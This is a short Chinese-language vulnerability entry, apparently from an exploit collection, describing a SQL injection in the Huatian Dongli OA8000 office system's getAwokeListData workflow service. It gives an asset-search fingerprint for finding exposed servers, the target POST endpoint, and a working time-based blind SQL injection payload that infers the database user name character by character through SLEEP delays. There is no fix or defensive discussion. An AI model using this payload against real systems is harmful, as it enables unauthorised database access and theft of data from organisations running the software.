# 华天动力OAgetAwokeListData存在SQL注入漏洞

华天动力 ｜ SQL注入 ｜ —
- **指纹**：`app="华天动力-OA8000"`
- **请求**：`POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1`

**Payload**
```
<buffalo-call>
<method>getAwokeListData</method>
<string>{"k":"SELECT IF(ASCII(SUBSTRING((SELECT USER()),1,1))=114,SLEEP(5),0)"}</string>
</buffalo-call>
```
- **响应特征**：200